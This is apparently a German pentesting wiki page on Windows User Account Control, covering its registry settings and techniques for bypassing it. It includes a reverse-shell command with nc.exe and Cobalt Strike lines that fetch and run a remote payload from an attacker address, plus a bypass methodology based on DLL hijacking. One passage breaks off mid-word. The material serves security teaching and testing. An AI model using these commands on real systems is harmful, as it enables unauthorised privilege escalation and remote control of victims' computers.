# UAC - Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsmeldung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos** ausgeführt, es sei denn, ein Administrator autorisiert diese Anwendungen/Aufgaben ausdrücklich, um Administratorzugriff auf das System zu erhalten. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, wird jedoch nicht als Sicherheitsgrenze betrachtet.

Für weitere Informationen zu Integritätsstufen:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorkonto 2 Tokens: einen Standardbenutzer-Schlüssel, um reguläre Aktionen auf regulärem Niveau auszuführen, und einen mit Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) behandelt, wie UAC im Detail funktioniert und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC spezifisch für ihre Organisation auf lokaler Ebene (unter Verwendung von secpol.msc) funktioniert oder über Gruppenrichtlinienobjekte (GPO) in einer Active Directory-Domänenumgebung konfiguriert und bereitgestellt werden. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich besprochen. Es gibt 10 Gruppenrichtlinieneinstellungen, die für UAC festgelegt werden können. Die folgende Tabelle bietet zusätzliche Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel     | Standardeinstellung                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ---------------------------------------------------------- |
| [Benutzerkontensteuerung: Administratorgenehmigungsmodus für das integrierte Administratorkonto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                |
| [Benutzerkontensteuerung: UIAccess-Anwendungen erlauben, zur Erhöhung aufzufordern, ohne den sicheren Desktop zu verwenden](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsmeldung für Administratoren im Administratorgenehmigungsmodus](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Aufforderung zur Zustimmung für Nicht-Windows-Binärdateien |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsmeldung für Standardbenutzer](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Aufforderung zur Eingabe von Anmeldeinformationen auf dem sicheren Desktop |
| [Benutzerkontensteuerung: Anwendung von Installationen erkennen und zur Erhöhung auffordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Enterprise) |
| [Benutzerkontensteuerung: Nur ausführbare Dateien erhöhen, die signiert und validiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                |
| [Benutzerkontensteuerung: Nur UIAccess-Anwendungen erhöhen, die an sicheren Orten installiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                  |
| [Benutzerkontensteuerung: Alle Administratoren im Administratorgenehmigungsmodus ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                  |
| [Benutzerkontensteuerung: Zum sicheren Desktop wechseln, wenn zur Erhöhung aufgefordert wird](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                  |
| [Benutzerkontensteuerung: Virtualisieren von Datei- und Registrierungsschreibfehlern auf benutzerspezifische Standorte](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                  |

### UAC Bypass-Theorie

Einige Programme werden **automatisch erhöht**, wenn der **Benutzer zur** **Administratorgruppe** gehört. Diese Binärdateien haben in ihren _**Manifests**_ die _**autoElevate**_-Option mit dem Wert _**True**_. Die Binärdatei muss auch **von Microsoft signiert** sein.

Um die **UAC** zu **umgehen** (von **mittlerer** Integritätsstufe **zu hoch** zu erhöhen), verwenden einige Angreifer diese Art von Binärdateien, um **beliebigen Code auszuführen**, da er von einem **Prozess mit hoher Integritätsstufe** ausgeführt wird.

Sie können das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals **überprüfen**. Und Sie können die **Integritätsstufe** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) **sehen**.

### UAC überprüfen

Um zu bestätigen, ob UAC aktiviert ist, führen Sie Folgendes aus:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, wenn es **`0`** ist oder **nicht existiert**, dann ist UAC **inaktiv**.

Überprüfen Sie dann, **welches Niveau** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Wenn **`0`**, wird UAC nicht auffordern (wie **deaktiviert**)
- Wenn **`1`**, wird der Administrator **nach Benutzername und Passwort** gefragt, um die Binärdatei mit hohen Rechten auszuführen (auf Secure Desktop)
- Wenn **`2`** (**Immer benachrichtigen**) wird UAC immer um Bestätigung des Administrators bitten, wenn er versucht, etwas mit hohen Rechten auszuführen (auf Secure Desktop)
- Wenn **`3`**, wie `1`, aber nicht unbedingt auf Secure Desktop
- Wenn **`4`**, wie `2`, aber nicht unbedingt auf Secure Desktop
- Wenn **`5`** (**Standard**) wird der Administrator gefragt, ob er nicht Windows-Binärdateien mit hohen Rechten ausführen möchte

Dann müssen Sie den Wert von **`LocalAccountTokenFilterPolicy`** überprüfen\
Wenn der Wert **`0`** ist, kann nur der **RID 500** Benutzer (**eingebauter Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn er `1` ist, können **alle Konten in der Gruppe "Administratoren"** dies tun.

Und schließlich überprüfen Sie den Wert des Schlüssels **`FilterAdministratorToken`**\
Wenn **`0`** (Standard), kann das **eingebaute Administratorkonto** Remote-Administrationsaufgaben durchführen, und wenn **`1`** kann das eingebaute Administratorkonto **nicht** Remote-Administrationsaufgaben durchführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

- Wenn `EnableLUA=0` oder **nicht vorhanden**, **kein UAC für niemanden**
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=1`, kein UAC für niemanden**
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=0`, kein UAC für RID 500 (eingebauter Administrator)**
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=1`, UAC für alle**

All diese Informationen können mit dem **metasploit** Modul gesammelt werden: `post/windows/gather/win_privs`

Sie können auch die Gruppen Ihres Benutzers überprüfen und das Integritätsniveau abrufen:
```
net user %username%
whoami /groups | findstr Level
```
## UAC-Umgehung

> [!NOTE]
> Beachten Sie, dass die UAC-Umgehung einfach ist, wenn Sie grafischen Zugriff auf das Opfer haben, da Sie einfach auf "Ja" klicken können, wenn die UAC-Eingabeaufforderung erscheint.

Die UAC-Umgehung ist in der folgenden Situation erforderlich: **die UAC ist aktiviert, Ihr Prozess läuft in einem Medium-Integritätskontext, und Ihr Benutzer gehört zur Administratorgruppe**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, die UAC zu umgehen, wenn sie auf dem höchsten Sicherheitsniveau (Immer) ist, als wenn sie auf einem der anderen Niveaus (Standard) ist.**

### UAC deaktiviert

Wenn die UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), können Sie **eine Reverse-Shell mit Administratorrechten** (hoher Integritätslevel) ausführen, indem Sie etwas wie Folgendes verwenden:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC-Umgehung mit Token-Duplikation

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegende UAC "Umgehung" (voller Zugriff auf das Dateisystem)

Wenn Sie eine Shell mit einem Benutzer haben, der in der Gruppe der Administratoren ist, können Sie **das C$**-Freigabe über SMB (Dateisystem) lokal auf einem neuen Laufwerk einbinden und Sie haben **Zugriff auf alles im Dateisystem** (sogar auf den Administrator-Hauptordner).

> [!WARNING]
> **Es scheint, dass dieser Trick nicht mehr funktioniert**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-Umgehung mit Cobalt Strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf dem maximalen Sicherheitsniveau eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben auch mehrere Module, um die **UAC** zu **umgehen**.

### KRBUACBypass

Dokumentation und Tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Umgehungs-Exploits

[**UACME** ](https://github.com/hfiref0x/UACME), das eine **Kompilation** mehrerer UAC-Umgehungs-Exploits ist. Beachten Sie, dass Sie **UACME mit Visual Studio oder MSBuild kompilieren müssen**. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Ak
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Auch auf der [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite erhalten Sie die Windows-Version `1607` aus den Build-Versionen.

#### Weitere UAC-Umgehungen

**Alle** Techniken, die hier verwendet werden, um AUC zu umgehen, **erfordern** eine **vollständige interaktive Shell** mit dem Opfer (eine gängige nc.exe-Shell reicht nicht aus).

Sie können eine **meterpreter**-Sitzung verwenden. Migrieren Sie zu einem **Prozess**, der den **Session**-Wert gleich **1** hat:

![](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC-Umgehung mit GUI

Wenn Sie Zugriff auf eine **GUI haben, können Sie einfach die UAC-Aufforderung akzeptieren**, wenn Sie sie erhalten, Sie benötigen wirklich keine Umgehung. Der Zugriff auf eine GUI ermöglicht es Ihnen, die UAC zu umgehen.

Darüber hinaus, wenn Sie eine GUI-Sitzung erhalten, die jemand verwendet hat (möglicherweise über RDP), gibt es **einige Tools, die als Administrator ausgeführt werden**, von denen aus Sie beispielsweise **cmd** direkt **als Admin** ausführen können, ohne erneut von UAC aufgefordert zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **stealthy** sein.

### Lauter Brute-Force-UAC-Umgehung

Wenn es Ihnen nichts ausmacht, laut zu sein, könnten Sie immer **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen, das** **nach Erhöhung der Berechtigungen fragt, bis der Benutzer es akzeptiert**.

### Ihre eigene Umgehung - Grundlegende UAC-Umgehungsmethodik

Wenn Sie sich **UACME** ansehen, werden Sie feststellen, dass **die meisten UAC-Umgehungen eine Dll Hijacking-Sicherheitsanfälligkeit ausnutzen** (hauptsächlich das Schreiben der bösartigen dll in _C:\Windows\System32_). [Lesen Sie dies, um zu lernen, wie Sie eine Dll Hijacking-Sicherheitsanfälligkeit finden](../windows-local-privilege-escalation/dll-hijacking/).

1. Finden Sie eine Binärdatei, die **autoelevate** (prüfen Sie, ob sie beim Ausführen auf einem hohen Integritätslevel läuft).
2. Verwenden Sie procmon, um "**NAME NOT FOUND**"-Ereignisse zu finden, die anfällig für **DLL Hijacking** sein können.
3. Sie müssen wahrscheinlich die DLL in einige **geschützte Pfade** (wie C:\Windows\System32) schreiben, in denen Sie keine Schreibberechtigungen haben. Sie können dies umgehen, indem Sie:
   1. **wusa.exe**: Windows 7, 8 und 8.1. Es ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (da dieses Tool von einem hohen Integritätslevel ausgeführt wird).
   2. **IFileOperation**: Windows 10.
4. Bereiten Sie ein **Skript** vor, um Ihre DLL in den geschützten Pfad zu kopieren und die anfällige und autoelevierte Binärdatei auszuführen.

### Eine weitere UAC-Umgehungstechnik

Besteht darin zu beobachten, ob eine **autoElevated Binärdatei** versucht, aus der **Registrierung** den **Namen/Pfad** einer **Binärdatei** oder **Befehls** zu **lesen**, die **ausgeführt** werden soll (dies ist interessanter, wenn die Binärdatei diese Informationen innerhalb des **HKCU** sucht).

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um einfach **Workflows zu erstellen und zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
